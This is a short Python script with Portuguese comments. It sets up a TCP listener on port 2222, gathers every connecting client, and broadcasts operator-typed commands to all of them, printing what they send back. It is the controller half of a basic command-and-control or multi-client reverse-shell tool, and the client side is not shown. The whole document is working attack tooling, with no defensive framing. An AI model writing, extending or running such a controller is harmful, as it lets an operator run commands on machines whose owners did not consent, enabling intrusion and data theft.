from socket import *
import threading


servidor = socket(AF_INET,SOCK_STREAM)
servidor.bind(("",2222))
servidor.listen(5)

clientes = []

# Clientes se conectando

def conexao(servidor):
    while True:
        cliente,endereço = servidor.accept()
        clientes.append(cliente)

t = threading.Thread(target = conexao,args =(servidor,))
t.start()
    #Comandos a serem executados pelos Clientes
while True:
    dados = input("[+] Comandos a serem executados: ")

    if clientes:
        for cliente in clientes:
           cliente.sendall(dados.encode())
           resultado = cliente.recv(2048).decode()
           print(resultado)








